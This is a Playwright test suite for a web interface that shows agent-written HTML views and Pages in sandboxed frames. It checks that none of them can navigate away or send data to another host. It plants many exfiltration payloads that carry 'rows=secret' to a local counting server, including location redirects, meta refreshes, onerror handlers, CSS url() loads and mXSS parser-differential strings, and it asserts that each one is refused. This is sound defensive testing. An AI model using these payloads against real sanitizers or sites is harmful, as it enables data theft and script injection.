import { privateRowImages } from "../tests/fixtures/private-view-images";
import type { Page } from "@playwright/test";
import {
  exitTest,
  startOtherHost,
  expectRefused,
  linkClicks,
  refusedByShell,
  type LinkClick,
  type OtherHost
} from "./exit-fixtures";
import {
  pageExitTitle,
  pageLoadExits,
  pageNavigationExits,
  pageTestTitles,
  tabOpeningClicks,
  type PageExit
} from "./page-exits";
import {
  expectOnInterface,
  expectPageRan,
  openPage,
  storePage,
  watchOpened
} from "./page-fixtures";
import { expect } from "./test";
import {
  apiOrigin,
  browserTurn,
  storeView,
  storeViews,
  signIn,
  uiOrigin,
  viewFrame,
  viewTitle
} from "./view-fixtures";
import { requestAnswered } from "./allowed-page-errors";
// The messages this spec's tests cause on purpose (see allowed-page-errors.ts).
exitTest.use({
  allowedPageErrors: {
    errors: [
      {
        name: "batched-page-navigation",
        reason:
          "Each navigation probe retains an isolated inner Page and its own terminal browser refusal.",
        matches: new RegExp(
          pageNavigationExits
            .flatMap((exit) => (exit.refusal ? [exit.refusal.source] : []))
            .join("|"),
          "u"
        ),
        tests: ["a Page refuses every frame and ancestor navigation"]
      },

      {
        name: "batched-scriptless-views",
        reason:
          "Playwright inspects the private-row documents, whose sandbox explicitly forbids scripts.",
        matches:
          /^Blocked script execution in 'about:srcdoc' because the document's frame is sandboxed and the 'allow-scripts' permission is not set\.$/u,
        tests: ["private rows retain every allowlist restriction"]
      },

      {
        name: "batched-page-resource-exits",
        reason:
          "The two shared Pages attempt every resource fixture and count each browser refusal before asserting network silence.",
        matches: new RegExp(
          [
            ...pageLoadExits.flatMap((exit) => (exit.refusal ? [exit.refusal.source] : [])),
            refusedByShell.source,
            /^Fetch API cannot load \S+ Refused to connect because it violates the document's Content Security Policy\.$/u
              .source
          ].join("|"),
          "u"
        ),
        tests: [
          "a Page refuses every resource exit in markup and scripts",
          "a Page refuses every resource exit in stylesheet files"
        ]
      },
      {
        name: "planted-view-exit",
        reason:
          "Chromium's own log line for a frame it did not let move to another address. These tests " +
          "plant the move in a generated view and assert that nothing reached the other host.",
        matches:
          /^Framing '[^']*' violates the following Content Security Policy directive: "frame-src 'none'"\. The request has been blocked\.\s*$/u,
        tests: [
          "a view refuses every frame navigation",
          "a view cannot leave its frame through location.href",
          "a view cannot leave its frame through location.assign",
          "a view cannot leave its frame through location.replace",
          "a view cannot leave its frame through a meta refresh in its document",
          "a view cannot leave its frame through a meta refresh a script adds",
          "a view cannot leave its frame through a link a script clicks outside its document",
          "a view cannot leave its frame through a download link a script clicks outside its document",
          "a view cannot move its frame to an address of the instance either"
        ]
      },
      {
        name: "page-file-that-is-not-there",
        reason:
          "Chromium's own log line: the Page of this test names a base address, the policy " +
          "refuses it, and the image beside it is then asked of the Page's own file set, which " +
          "holds no such file.",
        matches: requestAnswered(404),
        path: /^\/app-content\//u,
        tests: ["a Page refuses every resource exit in markup and scripts"]
      }
    ]
  }
});

// A view cannot move its own frame to another host. Each test plants one way of trying in a
// view, with data in the address, and shows it in the interface. Nothing is refused by the
// test: the other host is a real server on this machine that counts what reaches it, and it
// must count nothing. That the browser refused the move is read from its own log line, so a
// test cannot pass because the view never tried.

// Every test stores its own view and counts on its own other host, so none needs another before
// it. The file holds a third of the browser suite's time, and in parallel mode the shards of
// the hosted check split it test by test instead of keeping it in one worker.
exitTest.describe.configure({ mode: "parallel" });

type ViewKind = "html.rendered" | "private_hydrated_view";

/** Stores a view of the kind and opens the conversation that shows it. */
async function openView(page: Page, kind: ViewKind, html: string): Promise<void> {
  const headers = await signIn(page, uiOrigin);
  const conversation = await storeView(page.request, headers, `<h2>${viewTitle}</h2>${html}`, kind);
  await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);
}

interface Exit {
  name: string;
  /** What the view holds to get to `address`. */
  html(address: string): string;
}

const script = (body: (address: string) => string) => (address: string) =>
  `<script>${body(JSON.stringify(address))}</script>`;

// Ways a view moves its own frame. The shell refuses each of them. The links are clicked
// outside the document, where the view's own bootstrap neither sees nor cancels them: this is
// what a script does that wants to get past that bootstrap.
const frameExits: Exit[] = [
  { name: "location.href", html: script((address) => `location.href=${address}`) },
  { name: "location.assign", html: script((address) => `location.assign(${address})`) },
  { name: "location.replace", html: script((address) => `location.replace(${address})`) },
  {
    name: "a meta refresh in its document",
    html: (address) => `<meta http-equiv="refresh" content="0;url=${address}">`
  },
  {
    name: "a meta refresh a script adds",
    html: script(
      (address) =>
        `var refresh=document.createElement("meta");refresh.httpEquiv="refresh";refresh.content="0;url="+${address};document.head.appendChild(refresh)`
    )
  },
  {
    name: "a link a script clicks outside its document",
    html: script(
      (address) => `var link=document.createElement("a");link.href=${address};link.click()`
    )
  },
  {
    name: "a download link a script clicks outside its document",
    html: script(
      (address) =>
        `var link=document.createElement("a");link.href=${address};link.download="rows";link.click()`
    )
  }
];

// A click with a modifier key or the middle button does not move the frame. It opens the
// address in a new tab or window, or downloads it, and the shell has no say in that. So a
// link in a view has no address: these tests click one in every way and count.

/** Shows a view with one link to the other host, clicks it, and counts what left. */
async function expectClickReachesNothing(
  page: Page,
  kind: ViewKind,
  clicks: readonly LinkClick[],
  otherHost: OtherHost
): Promise<void> {
  const opened = watchOpened(page);
  const address = `${otherHost.origin}/hit?rows=secret`;
  await openView(
    page,
    kind,
    clicks
      .map(
        (click, index) => `<a id="go-${index}" ${click.attributes ?? ""} href="${address}">Open</a>`
      )
      .join("")
  );
  await expect(page.getByText("Loading view…")).toHaveCount(0);
  for (const [index, click] of clicks.entries()) {
    await exitTest.step(click.name, async () => {
      const link = viewFrame(page).locator(`#go-${index}`);
      await expect(link).toHaveText("Open");
      await expect(link).not.toHaveAttribute("href");
      await link.click(click.options);
    });
  }
  await otherHost.observeQuiet();
  expect(opened).toEqual([]);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

exitTest("the other host counts what does reach it", async ({ page, otherHost }) => {
  await page.goto(`${apiOrigin}/health`);
  await page.setContent(`<iframe src="${otherHost.origin}/hit?exit=control"></iframe>`);
  await expect.poll(() => otherHost.requests).toEqual(["GET /hit?exit=control"]);
  expect(otherHost.connections).toBeGreaterThan(0);
});

exitTest("a view refuses every frame navigation", async ({ page, refusals }) => {
  const hosts: OtherHost[] = [];
  const instanceAddress = `${apiOrigin}/health?from=view`;
  const asked: string[] = [];
  page.on("request", (request) => {
    if (request.url() === instanceAddress) asked.push(request.url());
  });
  try {
    const inputs: { html: string; kind: "html.rendered"; title: string }[] = [];
    for (const exit of frameExits) {
      const host = await startOtherHost();
      hosts.push(host);
      inputs.push({
        html: exit.html(`${host.origin}/hit?rows=secret`),
        kind: "html.rendered",
        title: `Navigation: ${exit.name}`
      });
    }
    inputs.push({
      html: `<script>location.href=${JSON.stringify(instanceAddress)}</script>`,
      kind: "html.rendered",
      title: "Navigation: instance address"
    });
    const headers = await signIn(page, uiOrigin);
    const conversation = await storeViews(page.request, headers, inputs);
    await page.goto(`${uiOrigin}/c/${conversation.id}`);
    for (const [index, exit] of frameExits.entries()) {
      const host = hosts[index];
      if (!host) throw new Error("A navigation probe needs its counting host");
      await exitTest.step(`a view cannot leave its frame through ${exit.name}`, async () => {
        await expect
          .poll(() =>
            refusals.filter((line) => refusedByShell.test(line) && line.includes(host.origin))
          )
          .toHaveLength(1);
        expect(host.requests).toEqual([]);
        expect(host.connections).toBe(0);
      });
    }
    await exitTest.step(
      "a view cannot move its frame to an address of the instance either",
      async () => {
        await expect
          .poll(() =>
            refusals.filter((line) => refusedByShell.test(line) && line.includes(apiOrigin))
          )
          .toHaveLength(1);
        expect(asked).toEqual([]);
      }
    );
  } finally {
    await Promise.all(hosts.map((host) => host.close()));
  }
});

exitTest("a view strips both tab-opening links", async ({ page, otherHost }) => {
  const clicks = linkClicks
    .filter((click) => tabOpeningClicks.includes(click.name))
    .map((click) =>
      click.options?.button === "middle" ? click : { ...click, attributes: "download" }
    );
  await expectClickReachesNothing(page, "html.rendered", clicks, otherHost);
});

// A view that holds private rows runs no script and needs none to send rows away: they are
// written into its HTML on the server. Its body is therefore written anew from an allowlist
// when it is shown. These tests read the document the frame was given.

/** The document the shell gave the frame of the view. */
async function composedDocument(page: Page): Promise<string> {
  await expect(page.getByText("Loading view…")).toHaveCount(0);
  const frame = page.locator(`iframe[title="${viewTitle}"]`).first().contentFrame();
  return (await frame.locator("iframe").getAttribute("srcdoc")) ?? "";
}

const privateCases: {
  title: string;
  run(fixtures: { page: Page; otherHost: OtherHost }): Promise<void>;
}[] = [];
function privateCase(title: string, run: (typeof privateCases)[number]["run"]): void {
  privateCases.push({ title, run });
}

exitTest.describe("a view with private rows is written from an allowlist", () => {
  exitTest.setTimeout(60_000);

  privateCase("it keeps nothing that names a host", async ({ page, otherHost }) => {
    const there = otherHost.origin;
    const host = new URL(there).host;
    const planted = [
      // Resource hints: the browser may look the host up without asking the content policy.
      `<link rel="dns-prefetch" href="//${host}">`,
      `<link rel="preconnect" href="${there}">`,
      `<link rel="prefetch" href="${there}/hit?hint=prefetch">`,
      `<link rel="stylesheet" href="${there}/hit?hint=stylesheet">`,
      '<meta http-equiv="x-dns-prefetch-control" content="on">',
      `<meta http-equiv="refresh" content="0;url=${there}/hit?exit=refresh">`,
      `<base href="${there}/">`,
      // Addresses a person can open, and elements that load one.
      `<a id="plain" href="${there}/hit?a=1" ping="${there}/hit?ping=1" target="_blank">Link</a>`,
      `<a id="fragment" href="#rows">Rows</a>`,
      `<map name="m"><area shape="rect" coords="0,0,9,9" href="${there}/hit?area=1"></map>`,
      `<form action="${there}/hit"><input name="rows" value="secret"><button formaction="${there}/hit?f=1">Send</button></form>`,
      `<iframe src="${there}/hit?frame=1"></iframe>`,
      `<iframe srcdoc="&lt;a href='${there}/hit?nested=1'&gt;x&lt;/a&gt;"></iframe>`,
      `<object data="${there}/hit?object=1"></object><embed src="${there}/hit?embed=1">`,
      `<img id="outside" alt="outside" src="${there}/hit?img=1">`,
      `<img id="set" alt="set" srcset="${there}/hit?srcset=1 1x">`,
      `<svg id="drawing" width="20" height="20"><a href="${there}/hit?svg=1"><rect width="9" height="9"/></a><image href="${there}/hit?image=1"/><use href="${there}/hit?use=1#x"/><circle id="dot" cx="5" cy="5" r="4" fill="url(${there}/hit?fill=1)"/></svg>`,
      `<style>@import url("${there}/hit?import=1");</style>`,
      `<style>p{background:url(${there}/hit?css=1)}</style>`,
      `<style>p{background:u\\72l(${there}/hit?escaped=1)}</style>`,
      `<p id="styled" style="background:url('${there}/hit?style=1')" onclick="location.href='${there}'">Styled</p>`,
      `<script>document.body.setAttribute("data-ran","true")</script>`,
      // What a static view is made of stays.
      "<style>#kept{color:rgb(1, 2, 3)}</style>",
      '<table><tr><th scope="col">Status</th></tr><tr><td id="kept" colspan="1" style="font-weight:700">open</td></tr></table>',
      '<img id="inline" alt="inline" width="1" height="1" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">',
      // The writer test checks these attributes; Chromium still sees every input for its network checks.
      privateRowImages(there).html
    ].join("");

    await openView(page, "private_hydrated_view", planted);
    const composed = await composedDocument(page);
    const view = viewFrame(page);

    // No address of the other host is anywhere in the document, in any spelling.
    expect(composed).not.toContain(host);
    expect(composed).not.toContain("@import");
    await expect(
      view.locator(
        "link, base, area, map, form, input, button, iframe, object, embed, script, image, use, [href], [ping], [target], [srcset], [onclick]"
      )
    ).toHaveCount(0);
    // The only meta elements are the three the composer writes: policy, charset, viewport.
    await expect(view.locator("meta")).toHaveCount(3);
    await expect(view.locator("meta[http-equiv]")).toHaveAttribute(
      "http-equiv",
      "Content-Security-Policy"
    );
    for (const id of ["outside", "set", "styled", "dot"]) {
      await expect(view.locator(`#${id}`)).toHaveCount(1);
    }
    await expect(view.locator("#outside")).not.toHaveAttribute("src");
    await expect(view.locator("#styled")).not.toHaveAttribute("style");
    await expect(view.locator("#dot")).not.toHaveAttribute("fill");
    await expect(view.locator("#plain")).toHaveText("Link");
    await expect(view.locator("#fragment")).toHaveText("Rows");
    // The table, its style block, its inline style and the embedded image are as written.
    await expect(view.locator("#kept")).toHaveText("open");
    await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");
    await expect(view.locator("#kept")).toHaveCSS("font-weight", "700");
    await expect(view.locator("#inline")).toHaveAttribute("src", /^data:image\/gif/u);
    await expect(view.locator("body")).not.toHaveAttribute("data-ran");

    await browserTurn(page);
    expect(otherHost.requests).toEqual([]);
    expect(otherHost.connections).toBe(0);
  });

  privateCase(
    "it shows row text that is markup as it stands on the allowlist, or not at all",
    async ({ page, otherHost }) => {
      const there = otherHost.origin;
      const host = new URL(there).host;
      // What a template with a placeholder in markup used to become: the row closes the element
      // it was placed in and goes on as markup of its own.
      const row = `</pre><link rel="dns-prefetch" href="//${host}"><a id="row-link" href="${there}/hit?rows=secret">Details</a><img id="row-image" src="${there}/hit?img=1" onerror="location.href='${there}'"><b id="row-bold">bold</b>`;

      await openView(page, "private_hydrated_view", `<pre id="rows">[{"note":"${row}"}]</pre>`);
      const composed = await composedDocument(page);
      const view = viewFrame(page);

      expect(composed).not.toContain(host);
      await expect(view.locator("link, [href], [onerror], [src]")).toHaveCount(0);
      // Formatting a row brings along is on the list and stays; it carries no address.
      await expect(view.locator("#row-link")).toHaveText("Details");
      await expect(view.locator("#row-bold")).toHaveText("bold");
      await view.locator("#row-link").click({ modifiers: ["ControlOrMeta"] });

      await browserTurn(page);
      expect(otherHost.requests).toEqual([]);
      expect(otherHost.connections).toBe(0);
    }
  );

  // The writer runs here on the tree Chromium's parser makes, not on a stub. These are the
  // places where what a parser reads and what it reads again from its own output differ.
  privateCase(
    "it writes nothing that reads differently the second time",
    async ({ page, otherHost }) => {
      const there = otherHost.origin;
      const link = (name: string) => `<a href="${there}/hit?${name}=1" onclick="x()">${name}</a>`;
      const planted = [
        // Read as elements where no script runs, as text where one does.
        `<noscript><p title="</noscript>${link("noscript").replaceAll('"', "&quot;")}">n</p></noscript>`,
        `<noscript>${link("noscript-child")}</noscript>`,
        // Its content is in a tree of its own.
        `<template>${link("template")}<script>x()</script></template>`,
        // The first closing tag ends a style block, whatever the CSS says.
        `<style><!--</style>${link("style-comment")}--></style>`,
        `<style>#kept::after{content:"</style>${link("style-string")}"}</style>`,
        `<style>#gone{color:red}/*<b>*/</style>`,
        "<style>#kept{color:rgb(1, 2, 3)}</style>",
        `<textarea></textarea>${link("after-textarea")}`,
        `<textarea>${link("textarea")}</textarea>`,
        `<title>${link("title")}</title><xmp>${link("xmp")}</xmp><plaintext-x>${link("unknown")}</plaintext-x>`,
        // In SVG and MathML a style block is markup, and some elements switch back to HTML.
        `<svg><style>${link("svg-style")}</style><desc>${link("svg-desc")}</desc><foreignObject>${link("foreign")}</foreignObject><title>${link("svg-title")}</title><rect id="shape" width="9" height="9"/></svg>`,
        `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=location.href='${there}'&gt;"></table></mtext><mi>${link("math")}</mi></math>`,
        `<svg></p><style><a id="</style><img src=1 onerror=location.href='${there}'>"></svg>`,
        // Comments are not written, and an attribute value that closes one stays a value.
        `<!--${link("comment")}--><!--><a href="${there}/hit?short=1">short</a>-->`,
        `<p id="titled" title="--><a href=x>">titled</p>`,
        '<p id="kept">kept</p>'
      ].join("");

      await openView(page, "private_hydrated_view", planted);
      const composed = await composedDocument(page);
      const view = viewFrame(page);

      // No address survives in any place the view's own parser reads as markup or as an address.
      await expect(
        view.locator(
          "[href], [src], [onclick], [onerror], script, noscript, template, textarea, title, xmp, math, desc, foreignObject, svg style, svg a, plaintext-x"
        )
      ).toHaveCount(0);
      expect(composed).not.toContain("<!--");
      expect(composed).not.toContain("onerror=");
      expect(composed).not.toContain('href="');
      // The links that stood outside what was left out are there as text without an address.
      const links = view.locator("a");
      await expect(links).toHaveText(["style-comment", "style-string", "after-textarea", "short"]);
      await expect(view.locator("#titled")).toHaveAttribute("title", "--><a href=x>");
      await expect(view.locator("#shape")).toHaveCount(1);
      await expect(view.locator("#kept")).toHaveText("kept");
      await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");

      await browserTurn(page);
      expect(otherHost.requests).toEqual([]);
      expect(otherHost.connections).toBe(0);
    }
  );
});

exitTest("private rows retain every allowlist restriction", async ({ page, otherHost }) => {
  await Promise.all(
    privateCases.map(async (probe) => {
      const viewPage = await page.context().newPage();
      await exitTest.step(probe.title, () => probe.run({ page: viewPage, otherHost }));
    })
  );
  // Every private-row document stays alive throughout the same observation window.
  await otherHost.observeQuiet();
});

// A Page is HTML and script an agent wrote, served by the instance as files. It is held like a
// view: the instance answers every HTML file as a shell with the Page in a frame inside, and
// the header of that answer is the policy of both. The Page runs scripts, so every way out is
// tried here by a script or by a person, with the same other host counting what arrives.

async function expectPageExitRefused(
  page: Page,
  exit: PageExit,
  otherHost: OtherHost,
  refusals: string[]
): Promise<void> {
  const opened = watchOpened(page);
  const view = await openPage(page, {
    html: exit.html?.(otherHost.origin),
    script: exit.script?.(otherHost.origin),
    files: { "assets/worker.js": 'postMessage("started");', ...exit.files?.(otherHost.origin) }
  });

  if (exit.act) {
    // What a person does in the Page. The Page is there to be acted on once its script ran.
    await expectPageRan(page);
    await view.locator(exit.act.target)[exit.act.how]();
  }
  if (exit.refusal) {
    await expectRefused(page, otherHost, refusals, exit.refusal);
  } else {
    await expectPageRan(page);
    await browserTurn(page);
  }
  if (exit.shows) {
    await expect(view.locator("body")).toHaveAttribute(exit.shows.attribute, exit.shows.value);
  }
  expect(opened).toEqual([]);
  expectOnInterface(page);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

exitTest.describe("a Page cannot reach another host or the page that holds it", () => {
  exitTest.setTimeout(60_000);

  exitTest("a Page refuses every frame and ancestor navigation", async ({ page, otherHost }) => {
    // Three independent holders keep each inner guard realm isolated while their file loads
    // overlap. Every probe still has its own terminal browser refusal and silence assertions.
    const holders = [page, await page.context().newPage(), await page.context().newPage()];
    await Promise.all(
      holders.map(async (holder, index) => {
        const refusals: string[] = [];
        holder.on("console", (message) => {
          if (message.type() === "error") refusals.push(message.text());
        });
        for (const exit of pageNavigationExits.filter(
          (_, probeIndex) => probeIndex % holders.length === index
        )) {
          refusals.length = 0;
          await exitTest.step(pageExitTitle(exit), () =>
            expectPageExitRefused(holder, exit, otherHost, refusals)
          );
        }
      })
    );
  });

  // Independent scopes keep every attempt alive in two Pages: one for inline markup and
  // scripts, one for stylesheet files. Navigations and hostile built-ins keep isolated frames.
  for (const [group, exits] of [
    [
      "markup and scripts",
      pageLoadExits.filter((exit) => !exit.files && !exit.name.startsWith("a ping of a link"))
    ],
    ["stylesheet files", pageLoadExits.filter((exit) => exit.files)]
  ] as const) {
    exitTest(
      `a Page refuses every resource exit in ${group}`,
      async ({ page, otherHost, refusals }) => {
        const opened = watchOpened(page);
        const fixtures = exits.map((exit, index) => {
          const prefix = `probe-${index}`;
          const there = `${otherHost.origin}/${prefix}`;
          const scope = (value: string) =>
            value
              .replaceAll("#page-title", `#${prefix}`)
              .replaceAll("data-worker", `data-${prefix}-worker`)
              .replaceAll("data-import", `data-${prefix}-import`);
          return { exit, prefix, there, scope };
        });
        const view = await openPage(page, {
          html: fixtures
            .map(
              ({ exit, prefix, there, scope }) =>
                `<section><h2 id="${prefix}">Probe</h2>${scope(exit.html?.(there) ?? "")}</section>`
            )
            .join("\n"),
          script: fixtures
            .map(
              ({ exit, prefix, there, scope }) =>
                `(() => { document.body.setAttribute("data-${prefix}", "tried"); ${scope(exit.script?.(there) ?? "")} })();`
            )
            .join("\n"),
          files: {
            "assets/worker.js": 'postMessage("started");',
            "assets/style.css": fixtures
              .map(({ exit, there, scope }) => scope(exit.files?.(there)["assets/style.css"] ?? ""))
              .join("\n")
          }
        });
        await expectPageRan(page);
        for (const { exit, prefix, scope } of fixtures) {
          await exitTest.step(pageExitTitle(exit), async () => {
            await expect(view.locator("body")).toHaveAttribute(`data-${prefix}`, "tried");
            if (exit.act) await view.locator(scope(exit.act.target))[exit.act.how]();
            if (exit.shows)
              await expect(view.locator("body")).toHaveAttribute(
                scope(exit.shows.attribute),
                exit.shows.value
              );
          });
        }
        // Match each URL-bearing refusal to its own probe, so one attempt cannot stand in
        // for a missing sibling. Inline-script and blob/data-worker diagnostics omit URLs;
        // those retain separate completion markers and an exact count per refusal pattern.
        const addressless = new Map<string, { refusal: RegExp; count: number }>();
        for (const { exit, prefix } of fixtures) {
          if (!exit.refusal) continue;
          if (
            /^(?:an inline script|an import map|speculation rules|a worker from)/u.test(exit.name)
          ) {
            const previous = addressless.get(exit.refusal.source);
            addressless.set(exit.refusal.source, {
              refusal: exit.refusal,
              count: (previous?.count ?? 0) + 1
            });
          } else {
            await expect
              .poll(
                () =>
                  refusals.filter(
                    (text) => exit.refusal?.test(text) && text.includes(`/${prefix}/`)
                  ).length,
                exit.name
              )
              .toBeGreaterThan(0);
          }
        }
        for (const { refusal, count } of addressless.values()) {
          await expect
            .poll(() => refusals.filter((text) => refusal.test(text)), refusal.source)
            .toHaveLength(count);
        }
        if (group === "markup and scripts") await otherHost.observeQuiet();
        await expect(view.locator("iframe, object, embed")).toHaveCount(0);
        expect(opened).toEqual([]);
        expectOnInterface(page);
        expect(otherHost.requests).toEqual([]);
        expect(otherHost.connections).toBe(0);
      }
    );
  }
});

exitTest.describe("a Page is held where the interface put it", () => {
  exitTest.setTimeout(60_000);

  exitTest(pageTestTitles.otherSite, async ({ page, otherHost, refusals }) => {
    const headers = await signIn(page, uiOrigin);
    const stored = await storePage(page, headers, {});

    await page.goto(`${otherHost.origin}/holder`);
    await page.evaluate((address) => {
      const frame = document.createElement("iframe");
      frame.src = address;
      document.body.appendChild(frame);
    }, stored.url);

    await expect
      .poll(() =>
        refusals.filter((text) =>
          /^Framing '[^']*' violates the following Content Security Policy directive: "frame-ancestors 'self' /u.test(
            text
          )
        )
      )
      .toHaveLength(1);
    await expect(
      page.frameLocator("iframe").frameLocator("iframe").locator("#page-title")
    ).toHaveCount(0);
  });

  exitTest(pageTestTitles.noOrigin, async ({ page, otherHost, refusals }) => {
    const session = `${apiOrigin}/api/v1/me`;
    const asked: string[] = [];
    page.on("request", (request) => {
      // The interface asks for the session itself. What counts is a request out of a frame.
      if (request.url() === session && request.frame() !== page.mainFrame()) {
        asked.push(request.url());
      }
    });

    const view = await openPage(page, {
      script: [
        `const read = (name, get) => { try { document.body.setAttribute(name, String(get())); } catch (error) { document.body.setAttribute(name, "threw " + error.name); } };`,
        `read("data-origin", () => self.origin);`,
        `read("data-cookie", () => document.cookie);`,
        `read("data-storage", () => localStorage.length);`,
        `read("data-session-storage", () => sessionStorage.length);`,
        `read("data-databases", () => indexedDB.open("rows"));`,
        `read("data-parent", () => parent.document.title);`,
        `read("data-top", () => top.document.cookie);`,
        `fetch(${JSON.stringify(session)}, { credentials: "include" }).then((answer) => document.body.setAttribute("data-session", String(answer.status)), (error) => document.body.setAttribute("data-session", "failed " + error.name));`
      ].join("\n")
    });
    await expectPageRan(page);
    const body = view.locator("body");

    // The Page's own files loaded and its stylesheet applies: it is not held by being broken.
    await expect(view.locator("#page-title")).toHaveCSS("color", "rgb(1, 2, 3)");
    await expect(body).toHaveAttribute("data-origin", "null");
    await expect(body).toHaveAttribute("data-cookie", "threw SecurityError");
    // The shim exposes only this preview's empty state, never host browser storage.
    await expect(body).toHaveAttribute("data-storage", "0");
    await expect(body).toHaveAttribute("data-session-storage", "threw SecurityError");
    await expect(body).toHaveAttribute("data-databases", "threw SecurityError");
    await expect(body).toHaveAttribute("data-parent", "threw SecurityError");
    await expect(body).toHaveAttribute("data-top", "threw SecurityError");
    // The instance's own API is another host to a Page: the policy names none.
    await expect(body).toHaveAttribute("data-session", "failed TypeError");
    await expect
      .poll(() => refusals.filter((text) => text.includes(`"connect-src 'none'"`)))
      .toHaveLength(1);
    expect(asked).toEqual([]);
    expect(otherHost.requests).toEqual([]);
  });
});
